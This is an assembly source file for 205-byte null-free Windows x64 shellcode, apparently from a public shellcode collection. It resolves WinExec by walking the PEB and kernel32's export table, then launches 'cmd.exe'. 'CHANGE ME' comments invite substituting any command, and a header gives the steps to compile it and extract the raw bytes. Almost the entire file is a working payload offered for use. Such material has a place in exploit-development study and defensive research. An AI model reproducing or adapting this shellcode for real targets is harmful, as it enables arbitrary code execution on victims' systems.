;# Shellcode Title: Windows/x64 - Dynamic Null-Free WinExec Shellcode(205 Bytes)
;# Shellcode Author: Bobby Cooke (boku)

; Compile & get shellcode from Kali:
;   nasm -f win64 popcalc.asm -o popcalc.o

;   for i in $(objdump -D popcalc.o | grep "^ " | cut -f2); do echo -n "\x$i" ; done

;   objdump -M intel -d popcalc.exe
;   Get kernel32.dll base address

;modified by 0xTriboulet
;
bits 64
default rel

segment .text
global main

main:
xor rdi, rdi            ; RDI = 0x0
mul rdi                 ; RAX&RDX =0x0
mov rbx, gs:[rax+0x60]  ; RBX = Address_of_PEB
mov rbx, [rbx+0x18]     ; RBX = Address_of_LDR
mov rbx, [rbx+0x20]     ; RBX = 1st entry in InitOrderModuleList / ntdll.dll
mov rbx, [rbx]          ; RBX = 2nd entry in InitOrderModuleList / kernelbase.dll
mov rbx, [rbx]          ; RBX = 3rd entry in InitOrderModuleList / kernel32.dll
mov rbx, [rbx+0x20]     ; RBX = &kernel32.dll ( Base Address of kernel32.dll)
mov r8, rbx             ; RBX & R8 = &kernel32.dll

; Get kernel32.dll ExportTable Address
mov ebx, [rbx+0x3C]     ; RBX = Offset NewEXEHeader
add rbx, r8             ; RBX = &kernel32.dll + Offset NewEXEHeader = &NewEXEHeader
xor rcx, rcx            ; Avoid null bytes from mov edx,[rbx+0x88] by using rcx register to add
add cx, 0x88ff
shr rcx, 0x8            ; RCX = 0x88ff --> 0x88
mov edx, [rbx+rcx]      ; EDX = [&NewEXEHeader + Offset RVA ExportTable] = RVA ExportTable
add rdx, r8             ; RDX = &kernel32.dll + RVA ExportTable = &ExportTable

; Get &AddressTable from Kernel32.dll ExportTable
xor r10, r10
mov r10d, [rdx+0x1C]    ; RDI = RVA AddressTable
add r10, r8             ; R10 = &AddressTable

; Get &NamePointerTable from Kernel32.dll ExportTable
xor r11, r11
mov r11d, [rdx+0x20]    ; R11 = [&ExportTable + Offset RVA Name PointerTable] = RVA NamePointerTable
add r11, r8             ; R11 = &NamePointerTable (Memory Address of Kernel32.dll Export NamePointerTable)

; Get &OrdinalTable from Kernel32.dll ExportTable
xor r12, r12
mov r12d, [rdx+0x24]    ; R12 = RVA  OrdinalTable
add r12, r8             ; R12 = &OrdinalTable

jmp short apis

; Get the address of the API from the Kernel32.dll ExportTable
getapiaddr:
pop rbx                   ; save the return address for ret 2 caller after API address is found
pop rcx                   ; Get the string length counter from stack
xor rax, rax              ; Setup Counter for resolving the API Address after finding the name string
mov rdx, rsp              ; RDX = Address of API Name String to match on the Stack 
push rcx                  ; push the string length counter to stack
loop:
mov rcx, [rsp]            ; reset the string length counter from the stack
xor rdi,rdi               ; Clear RDI for setting up string name retrieval
mov edi, [r11+rax*4]      ; EDI = RVA NameString = [&NamePointerTable + (Counter * 4)]
add rdi, r8               ; RDI = &NameString    = RVA NameString + &kernel32.dll
mov rsi, rdx              ; RSI = Address of API Name String to match on the Stack  (reset to start of string)
repe cmpsb                ; Compare strings at RDI & RSI
je resolveaddr            ; If match then we found the API string. Now we need to find the Address of the API 
incloop:
inc rax
jmp short loop

; Find the address of GetProcAddress by using the last value of the Counter
resolveaddr:
pop rcx                     ; remove string length counter from top of stack
mov ax, [r12+rax*2]         ; RAX = [&OrdinalTable + (Counter*2)] = ordinalNumber of kernel32.<API>
mov eax, [r10+rax*4]        ; RAX = RVA API = [&AddressTable + API OrdinalNumber]
add rax, r8                 ; RAX = Kernel32.<API> = RVA kernel32.<API> + kernel32.dll BaseAddress
push rbx                    ; place the return address from the api string call back on the top of the stack
ret                         ; return to API caller

api db "WinExec"            ; <----!! CHANGE ME !! NOTE: Changing this requires you rework the last block of assembly to handle the call
;Boku did some magic here, and the API call does not have to be null terminated, as long as we pass the correct string length in cl to the getapiaddr function
;we can leverage that to omit one null byte, use an offset, and retain 0-null byes in the shellcode

apis:                   	; API Names to resolve addresses
			        ; WinExec | String length : 7
xor rcx, rcx
add cl, 0x7                 ; String length for compare string
mov rax, [rel api]          ; Load pointer to api
push rax    	            ; push pointer to api
push rcx                    ; push the string length counter to stack
call getapiaddr             ; Get the address of the API from Kernel32.dll ExportTable
mov r14, rax                ; R14 = Kernel32.WinExec Address

; THIS WHOLE SECTION IS GOING TO NEED REWORK IF YOU CHANGE THE API
;
;
; UINT WinExec(
;   LPCSTR lpCmdLine,    => RCX = cmd ,0x0
;   UINT   uCmdShow      => RDX = 0x1 = SW_SHOWNORMAL
; );
xor rcx, rcx
mul rcx                     ; RAX & RDX & RCX = 0x0
push rax                    ; Null terminate string on stack
lea rax, [apis]             ; Load pointer to cmd
add rax, 0x37               ; CHANGE THIS OFFSET IF YOU CHANGE ANYTHING IN APIS<------------------------------------------------
push rax    	            ; push pointer to cmd
mov rcx, rax                ; RCX = cmd
inc rdx                     ; RDX = 0x1 = SW_SHOWNORMAL
sub rsp, 0x20               ; WinExec clobbers first 0x20 bytes of stack (Overwrites our command string when proxied to CreatProcessA)
call r14                    ; Call WinExec(cmd, SW_HIDE)

cmd db "cmd.exe",0x0        ; <--- !! CHANGE ME !! change cmd to execute commands through WinExec
;Passing a function that takes more than one argument is going to take a good bit of rework, that's probably what I'll work on next






